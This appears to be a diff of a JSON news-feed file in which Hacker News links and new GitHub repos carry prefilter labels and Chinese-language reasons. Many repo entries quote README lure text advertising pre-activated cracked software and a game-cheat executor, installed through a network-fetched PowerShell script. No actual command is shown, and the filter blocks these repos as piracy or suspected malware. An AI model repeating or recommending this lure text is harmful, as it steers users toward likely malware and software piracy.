+  "body": "Ashampoo WinOptimizer 2026 Standalone Setup with Full Feature Set Enabled\n\nREADME 節錄： # Ashampoo WinOptimizer 2026 Standalone Setup for Windows 11 ### 📦 PowerShell Install Button --- The Ashampoo Winoptimizer standalone desktop package delivers a complete, pre-activated Windows x64 build suitable for offline deployment and local testing environments. All optimization, cleaning, and system maintenance features are enabled out of the box, eliminating the need for post-install configuration or activation steps. The package is distributed as a self-contained installer with a verified build dated November 2026, ensuring consistency across workstations and reproducible test conditions. Designed for technical users and IT administrators, it supports straightforward provisioning in isolated or air-gapped infrastructures while maintaining full feature parity with the complete product suite. ## 🔧 Requirements - **OS:** Windows 10 / 11 - **Shell:** PowerShell 5.1+ or PowerShell 7+ - **Network:** internet access to download the script - **Privileges:** standard user ## Features - **Complete Standalone Deployment:** Ships as a fully self-contained desktop package for Windows x64, eliminating dependency resolution, package manager requirements, or network access during installation. The build is staged for immediate execution on target workstations. - **Pre-Activated Configuration:** All premium modules and feature tiers are enabled in the distributed build, removing the need for post-in",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版破解軟體，屬灌星SEO垃圾repo"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Faster Retrieval for Better, More Efficient RAG",
+  "url": "https://machinelearning.apple.com/research/faster-retrieval",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T16:57:45.000Z",
+  "body": "Article URL: https://machinelearning.apple.com/research/faster-retrieval Comments URL: https://news.ycombinator.com/item?id=50455633 Points: 172 # Comments: 29",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Apple 研究 RAG 檢索加速，與 AI 開發相關"
+  },
+  "scores": [
+   32,
+   24
+  ],
+  "score": 28,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "PHISHER420/autodesk-inventor-desktop-config",
+  "url": "https://github.com/PHISHER420/autodesk-inventor-desktop-config",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1300,
+  "language": "HTML",
+  "topics": [
+   "autodesk-inventor-pro",
+   "autodesk-inventor-pro-pc",
+   "automation",
+   "developer-tools",
+   "inventor",
+   "inventor-automation",
+   "inventor-design",
+   "inventor-parts",
+   "inventory-app",
+   "inventory-system",
+   "offsets-dump",
+   "open-source",
+   "python",
+   "real-time-inventory",
+   "scripts",
+   "software-engineering",
+   "stock-inventory",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:40:29Z",
+  "body": "Autodesk Inventor 2026 Professional Desktop Installer with Pre-Configured Full Feature Set\n\nREADME 節錄： # Autodesk Inventor 2026 Professional Desktop Suite for Windows 11 ### 💻 PowerShell Installer --- Autodesk Inventor 2026 delivers a complete professional-grade desktop configuration for Windows x64, packaged as a ready-to-run installer with all modeling, simulation, and documentation features pre-activated. The build supports full offline deployment, allowing the entire suite to be provisioned without network dependencies or post-install activation steps. Core parametric design, assembly modeling, sheet metal, and drawing production modules are enabled out of the box, alongside the standard part and assembly analysis toolset. The installer targets standalone workstation environments where deterministic, repeatable configuration is required, and includes the complete feature set of the release in a single distribution package. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Complete Feature Set Pre-Activated:** All professional-grade modeling, simulation, and documentation tools are enabled out of the box, eliminating the need for post-install configuration or activation steps. - **Ready-to-Run Professional Configuration:** The installer delivers a fully configured environment with default preferences, templates, and libraries pre-populated for immediate",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版預啟用軟體安裝器,疑惡意程式,非開發相關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "A false smoke alarm almost drowned Jane Street's only NYC datacenter",
+  "url": "https://michael.bacarella.com/2026/11/10/false-smoke-alarm-jane-street-datacenter",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T16:38:44.000Z",
+  "body": "Article URL: https://michael.bacarella.com/2026/11/10/false-smoke-alarm-jane-street-datacenter/ Comments URL: https://news.ycombinator.com/item?id=50455394 Points: 435 # Comments: 222",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "資料中心火警事故，屬一般科技新聞，與開發工具無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "CodeSouvik/clion-standalone-enhancement",
+  "url": "https://github.com/CodeSouvik/clion-standalone-enhancement",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1298,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "clion-2026",
+   "clion-download-windows",
+   "cmake-ide",
+   "cpp-ide",
+   "desktop",
+   "developer-tools",
+   "jetbrains-clion",
+   "jetbrains-clion-install-setup-2026",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:48:32Z",
+  "body": "CLion full installer: complete standalone setup, all features activated\n\nREADME 節錄： # 🚀 CLion Setup — Complete Standalone Install for Windows 10/11 ### ⌨️ PowerShell Command Button --- The full standalone installer for CLion is built and ready to deploy, packing every feature into one clean setup with no extra hoops to jump through. Everything ships activated and configured out of the box, so you spend your time in the editor instead of babysitting a setup wizard. This build runs as a self-contained desktop install — grab it, run it, and get straight into your code. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Everything unlocked from the first launch.** The full feature set is live out of the box — no activation prompts, no license screens, no trial timers. You install, you open, you work. - **Fully standalone setup.** The installer ships with every dependency it needs. No separate runtime downloads, no \"missing component\" errors mid-install, no internet connection required to get a working build. - **One-pass installer, zero babysitting.** Run it once and it handles the whole deployment — files placed, environment wired up, toolchain configured. No manual path editing, no registry fiddling, no post-install checklist. - **Complete feature parity with the full edition.** Code intelligence, refactoring tools, debugger integration, build system support,",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "疑似盜版破解安裝器，誘導執行PowerShell，非正常開發專案"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Show HN: Yogurt – Free, private, open-source alternative to Granola",
+  "url": "https://github.com/FrigadeHQ/yogurt",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T15:33:06.000Z",
+  "body": "Hey HN, I’m Eric and I want to share an OSS project that I’ve been building in my free time. Yogurt is a free, MIT licensed desktop app that uses on-device AI models to transcribe, summarize, and chat with your meetings. Here's a quick demo video: https://www.youtube.com/watch?v=BFfbXAwRq98 Similar to Granola, Yogurt runs in the background and does not join your calls. But unlike Granola, Yogurt is open-source, free to use, and private. Your meeting transcripts, call recordings, and summaries never leave your computer. As small OSS models have gotten faster and more powerful, Yogurt seemed like a pretty obvious win for privacy and cost conscious folks. You do not need a frontier model to summarize meeting notes or answer questions about them. And if you want to make your notes available to a frontier model, you can just share it with Anthropic, OpenAI, etc. directly via Yogurt’s local MCP server. There’s no need to use a paid cloud service as a middleman. I tried some of the most popular OSS note taking tools, and most were missing features like calendar integration, MCP server, etc. or required you to connect or create an account. And more than that, they didn’t feel polished enough for it to be something I actually wanted to use daily, and so I built Yogurt to scratch that itch. I spent a lot of time fine-tuning every UI interaction/animation and optimizing the model calls to get the most out of your hardware + make it snappy. To support Windows/Mac/Linux, I decided to go w",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "開源本地 AI 會議工具，內建 MCP 伺服器，與開發相關"
+  },
+  "scores": [
+   38,
+   52
+  ],
+  "score": 45,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "sajawal-12/cubase-studio-desktop",
+  "url": "https://github.com/sajawal-12/cubase-studio-desktop",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1298,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "cubase",
+   "cubase-15",
+   "cubase-for-beginners",
+   "cubase-pro",
+   "cubase-pro-2026",
+   "cubase-setup",
+   "cubase-tutorial",
+   "cubase-windows-download",
+   "cubasecubase-pro",
+   "cube-solver",
+   "cubic-splines",
+   "developer-tools",
+   "mixing-and-mastering",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "steinberg-cubase",
+   "vst3-plugins"
+  ],
+  "publishedAt": "2026-11-06T20:50:21Z",
+  "body": "Cubase Studio 2026 desktop setup with full plugin suite and complete feature set\n\nREADME 節錄： # Cubase Studio 2026: Complete Plugin Suite for Windows 11 ### 💻 PowerShell Installer --- The Cubase Studio 2026 standalone desktop package delivers a complete production environment with all bundled plugins, instruments, and feature modules enabled at install time, eliminating the need for separate component downloads or post-install activation steps. This build targets Windows x64 desktop systems and is packaged for immediate offline deployment across testing and workstation environments. All audio engine components, mixing console extensions, and VST resources are integrated directly into the installer payload, ensuring version consistency across the full feature set. The package maintains a fixed, verifiable file manifest so that deployment integrity can be confirmed prior to execution on any target machine. ## 🔧 Requirements - **OS:** Windows 10 / 11 - **Shell:** PowerShell 5.1+ or PowerShell 7+ - **Network:** internet access to download the script - **Privileges:** standard user ## Features - **Unified Plugin Suite:** All stock and bundled plugins are pre-installed and authorized within a single local package, eliminating the need for separate download, registration, or activation workflows. - **Complete Feature Set Enabled:** Every module, instrument, and effect included in the build is available on first launch, including advanced mixing, mastering, and sequencing tools. - *",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "盜版 Cubase 破解安裝腳本，非開發工具"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Atuin Threads: All your agent sessions on every machine",
+  "url": "https://blog.atuin.sh/threads-agent-sessions",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T14:10:46.000Z",
+  "body": "Article URL: https://blog.atuin.sh/threads-agent-sessions/ Comments URL: https://news.ycombinator.com/item?id=50453637 Points: 196 # Comments: 75",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "Atuin Threads 跨機同步 agent session，與開發工具有關"
+  },
+  "scores": [
+   34,
+   58
+  ],
+  "score": 46,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "ebtsamalhakmy-sketch/desktop-backup-suite",
+  "url": "https://github.com/ebtsamalhakmy-sketch/desktop-backup-suite",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1296,
+  "language": "TypeScript",
+  "topics": [
+   "aomei",
+   "aomei-partition",
+   "aomei-setup",
+   "automation",
+   "developer-tools",
+   "disk-manager",
+   "disk-partitioning",
+   "merge-partitions",
+   "open-source",
+   "os-migration",
+   "partition-assistant",
+   "partition-manager",
+   "partition-recovery",
+   "partition-tool",
+   "python",
+   "resize-partition",
+   "scripts",
+   "software-engineering",
+   "split-partition",
+   "utility"
+  ],
+  "publishedAt": "2026-11-06T20:53:28Z",
+  "body": "Aomei Backupper 2026: Full-Feature Desktop Backup and Recovery Suite\n\nREADME 節錄： # AOMEI Backupper 2026: Full-Featured Standalone Backup Suite for Windows 11 ### 🔌 PowerShell Setup Button --- AOMEI Backupper 2026 is a complete standalone desktop backup and recovery suite delivered as a single self-contained installer with all features pre-activated and ready to run. The package provides full disk imaging, system and partition cloning, scheduled incremental and differential backups, and bare-metal restore capabilities without requiring additional activation steps or network access. Built for local deployment on Windows x64 desktop environments, the installer bundles every component needed for immediate offline installation. ## 📋 System Requirements - **OS:** Windows 10 / 11 - **Shell:** PowerShell 5.1+ or PowerShell 7+ - **Network:** internet access to download the script - **Privileges:** standard user ## Features - **Complete Backup Suite:** Provides full system, disk, partition, and file-level backup capabilities within a single standalone package, enabling bare-metal recovery and granular data protection without external dependencies. - **Pre-Activated Installation:** All premium features are unlocked at install time, eliminating the need for license entry, online activation, or post-install configuration. - **Full Working Installer:** Ships as a self-contained setup executable that deploys all components, services, and drivers required for immediate operation on the tar",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "破解軟體分發repo，與AI/開發工具無實質關聯"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Hyper-Realistic Sand with WebGL2",
+  "url": "https://av.github.io/safe-sand",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T13:39:29.000Z",
+  "body": "Article URL: https://av.github.io/safe-sand/ Comments URL: https://news.ycombinator.com/item?id=50453288 Points: 329 # Comments: 66",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "WebGL2 網頁圖形技術,與前端及遊戲開發相關"
+  },
+  "scores": [
+   60,
+   75
+  ],
+  "score": 67,
+  "picked": true,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "IsaiaR09/daemon-pro-desktop",
+  "url": "https://github.com/IsaiaR09/daemon-pro-desktop",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1295,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "daemon-2026",
+   "daemon-tools",
+   "daemon-tools-install-setup-windows-2026",
+   "daemon-tools-pro-advanced",
+   "daemon-tools-pro-vs-ultra",
+   "daemon-tools-ultra",
+   "daemon-tools-ultra-2026",
+   "daemon-tools-ultra-download",
+   "desktop",
+   "developer-tools",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:50:44Z",
+  "body": "daemon-pro: Complete Standalone Desktop Setup with Full Feature setup\n\nREADME 節錄： # Daemon Pro: Complete Standalone Feature-Rich Desktop Suite for Windows 11 ### ⚡ PowerShell Setup Button --- Daemon-Pro delivers a complete standalone desktop deployment with all features fully activated, eliminating dependency resolution and post-install configuration. The package bundles the entire runtime environment into a single self-contained distribution, ready to execute immediately after extraction on the target desktop platform. Built for offline deployment and local testing workflows, Daemon-Pro ensures consistent behavior across environments without requiring network access or supplementary tooling. Its pre-activated configuration removes setup friction while preserving full feature parity with the production release. ## ✅ Requirements - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Full Feature Activation:** All modules and capabilities are enabled out of the box, eliminating the need for separate license configuration or runtime activation steps. - **Standalone Deployment:** The package is self-contained and does not depend on external services, shared runtimes, or auxiliary installers to operate on the target desktop. - **Ready-to-Run Configuration:** Default settings are pre-tuned for immediate execution, allowing the application to",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "SEO灌星疑為破解版/惡意PowerShell腳本,非開發用"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Can a Linear Program Do Weight-Space Programming?",
+  "url": "https://nathan.rs/posts/weight-space-lp",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T12:30:17.000Z",
+  "body": "Article URL: https://nathan.rs/posts/weight-space-lp/ Comments URL: https://news.ycombinator.com/item?id=50452655 Points: 253 # Comments: 37",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "探討以線性規劃做模型權重空間編程,屬 AI 模型技術"
+  },
+  "scores": [
+   32,
+   24
+  ],
+  "score": 28,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "tss878/delta-executor-toolkit",
+  "url": "https://github.com/tss878/delta-executor-toolkit",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1295,
+  "language": "TypeScript",
+  "topics": [
+   "automation",
+   "delta-exec",
+   "delta-executor-26",
+   "delta-executor-exploit",
+   "delta-executor-for-free",
+   "delta-executor-for-pc-2026",
+   "delta-executor-for-win",
+   "delta-executor-lua",
+   "delta-executor-pc-2026",
+   "delta-for-pc",
+   "delta-for-pc-2026",
+   "delta-free-executor",
+   "delta-key-bypass",
+   "delta-lua-executor",
+   "developer-tools",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "utility"
+  ],
+  "publishedAt": "2026-11-06T20:51:54Z",
+  "body": "Delta Executor for PC: Full Working Installer with All Tools Pre-Configured\n\nREADME 節錄： # Delta Executor for PC — Game Enhancer for Windows 10/11 ### 🔧 PowerShell Setup Button --- The delta-executor-for-pc-bypass package delivers a fully working installer with every tool pre-configured and ready to run straight from your desktop. Nothing extra to assemble, no missing dependencies — just a prepared build that goes in clean and launches without friction. This is the standalone desktop deployment you drop in when you want the setup done right the first time. Everything ships in one package, tuned and verified before it reaches your machine. ## ✅ Requirements - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Pre-configured toolkit.** Every component ships wired up and ready — no hunting for dependencies, no manual path edits, no post-install tweaking. Launch it and it works. - **Pre-activated build.** The installer arrives fully activated out of the box. Skip the key grind, skip the setup wizard, get straight to running your scripts. - **Standalone desktop deployment.** A single self-contained package for Windows x64. No external runtime hooks, no background services to babysit, no leftover clutter after you're done. - **All tools bundled in.** The full toolset is staged inside the build — script hub access, injection utilities, and t",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "遊戲外掛腳本中心，灌星SEO垃圾包"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "My AI agents found an unmapped Maya site?",
+  "url": "https://pietromiotti.com/latest/maya-site",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T12:05:22.000Z",
+  "body": "Article URL: https://pietromiotti.com/latest/maya-site Comments URL: https://news.ycombinator.com/item?id=50452455 Points: 941 # Comments: 341",
+  "prefilter": {
+   "label": "PASS",
+   "reason": "AI agent 實際應用案例，與 agent 開發相關"
+  },
+  "scores": [
+   45,
+   58
+  ],
+  "score": 51,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "JasonCharb/directory-opus",
+  "url": "https://github.com/JasonCharb/directory-opus",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1294,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "desktop",
+   "developer-tools",
+   "directory-opus",
+   "directory-opus-crack-2026",
+   "directory-opus-for-win",
+   "directory-opus-free",
+   "directory-opus-free-2026",
+   "directory-opus-setup",
+   "open-source",
+   "opus-2026",
+   "opus-crack",
+   "opus-cracked",
+   "opus-free",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:54:11Z",
+  "body": "directory-opus: complete standalone desktop setup with all features pre-enabled, ready to run\n\nREADME 節錄： # 📁 directory-opus: Complete Standalone Feature Suite Windows Desktop Client ### 🛠️ PowerShell Setup Button --- directory-opus delivers a complete standalone desktop deployment with all features pre-activated and ready to run immediately after setup. The build packages the full feature set into a single self-contained configuration, eliminating dependency resolution and post-install activation steps. Designed for Windows x64 desktop environments, it supports offline installation and consistent provisioning across local workstations. The package targets technical users who require a reproducible, feature-complete installation without external service calls or runtime configuration overhead. ## 📋 System Requirements - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Complete Feature Set Enabled:** All application capabilities are active from first launch, with no additional activation, registration, or configuration steps required. - **Standalone Deployment:** Ships as a self-contained package that runs independently on the desktop without relying on external services or dependencies. - **Pre-Configured Environment:** Core settings, preferences, and defaults are pre-tuned for immediate productive use. - **Offline-Ready Operatio",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "破解軟體散佈，非開發工具"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Using voltage glitching to unleash the A100 in my mining card",
+  "url": "https://blog.kate.land/posts/using-voltage-glitching-to-unlock-the-a100",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T10:48:40.000Z",
+  "body": "Article URL: https://blog.kate.land/posts/using-voltage-glitching-to-unlock-the-a100/ Comments URL: https://news.ycombinator.com/item?id=50451903 Points: 273 # Comments: 112",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "硬體超頻改造，與開發工具無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Elegantic/designcenter-nx-desktop",
+  "url": "https://github.com/Elegantic/designcenter-nx-desktop",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1279,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "desktop",
+   "developer-tools",
+   "nx-cad",
+   "nxopen",
+   "open-source",
+   "python",
+   "scripts",
+   "siemens-2026",
+   "siemens-cad",
+   "siemens-nx",
+   "siemens-nx-2026",
+   "siemens-nx-download",
+   "siemens-nx-free",
+   "siemens-nx-pro-install-windows-2026",
+   "software-engineering",
+   "system",
+   "utility",
+   "windows-app"
+  ],
+  "publishedAt": "2026-11-06T20:52:51Z",
+  "body": "Designcenter-NX: Full-Feature Desktop Installer for Immediate Deployment\n\nREADME 節錄： # 🚀 Designcenter-NX: Full-Featured Desktop Installer for Windows 11 ### 🔌 PowerShell Setup Button --- Designcenter-NX is a standalone desktop installer package delivering the complete feature set in a pre-activated local build, intended for Windows x64 environments requiring immediate offline deployment without additional configuration steps. The installer bundles all components into a self-contained distribution, streamlining provisioning for testing and production workstations alike. Built for reproducibility and minimal setup overhead, it supports direct execution on target systems with no external dependencies or runtime downloads required. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Core Build Parameters This build is distributed as a self-contained desktop installation package with all functional modules enabled and pre-configured for immediate deployment. No activation, account registration, or post-install configuration steps are required; the installer provisions the complete application state during setup and verifies component integrity before first launch. **Build Profile** - **Distribution Type:** Pre-activated standalone installer - **Target Platform:** Windows x64 Desktop - **Deployment Model:** Offline-capable, single-package installation - **Feature State:** All",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "疑似破解/惡意 PowerShell 安裝器，與 AI 或開發工具無關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Tim Peters has died",
+  "url": "https://discuss.python.org/t/in-memoriam-tim-peters-1952-2026/110028",
+  "source": "Hacker News",
+  "sourceId": "hn",
+  "kind": "rss",
+  "stars": null,
+  "language": null,
+  "topics": null,
+  "publishedAt": "2026-11-11T07:03:17.000Z",
+  "body": "https://www.reddit.com/r/Python/s/2Cm5dBcvQw Comments URL: https://news.ycombinator.com/item?id=50450488 Points: 941 # Comments: 101",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "Python 社群人物訃聞，非開發工具或模型"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ },
+ {
+  "title": "Vesuvio1/display-fusion",
+  "url": "https://github.com/Vesuvio1/display-fusion",
+  "source": "GitHub 新專案",
+  "sourceId": "gh-new",
+  "kind": "github",
+  "stars": 1271,
+  "language": "HTML",
+  "topics": [
+   "automation",
+   "desktop-tools",
+   "developer-tools",
+   "display-management",
+   "displayfusion",
+   "displayfusion-2026",
+   "displayfusion-multi-monitor-install-windows-2026",
+   "displayfusion-pro",
+   "displayfusion-setup",
+   "dual-monitor",
+   "for-displayfusion-tools",
+   "monitor-profiles",
+   "monitor-setup",
+   "open-source",
+   "python",
+   "scripts",
+   "software-engineering",
+   "system",
+   "taskbar-tools",
+   "utility"
+  ],
+  "publishedAt": "2026-11-06T20:54:55Z",
+  "body": "Display Fusion 2026 standalone desktop setup with complete feature configuration\n\nREADME 節錄： # Display Fusion 2026: Multi-Monitor Management Suite for Windows 11 ### 🖥️ PowerShell Setup --- Display Fusion 2026 is a complete standalone desktop installation that delivers the full feature set in a ready-to-run package, eliminating the need for separate configuration or post-install activation steps. Built for Windows x64 environments, the distribution bundles all components into a single self-contained installer suitable for offline deployment and local testing. The build ships fully activated, ensuring every capability is available immediately upon completion of setup. It is intended for workstation provisioning and controlled deployment scenarios where a consistent, pre-configured desktop application is required. ## 🔧 Requirements - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Unified Multi-Monitor Management:** Centralizes control of all connected displays from a single desktop interface, enabling per-monitor configuration of resolution, orientation, refresh rate, and color profiles without navigating separate system dialogs. - **Pre-Activated Feature Set:** The standalone build ships with the complete feature tier enabled by default, including advanced window management, scripted automation, and display profile switching, req",
+  "prefilter": {
+   "label": "BLOCK",
+   "reason": "疑似破解軟體分發、灌星 SEO 垃圾，非開發相關"
+  },
+  "scores": null,
+  "score": null,
+  "picked": false,
+  "promptVersion": "118d0780"
+ }
+]
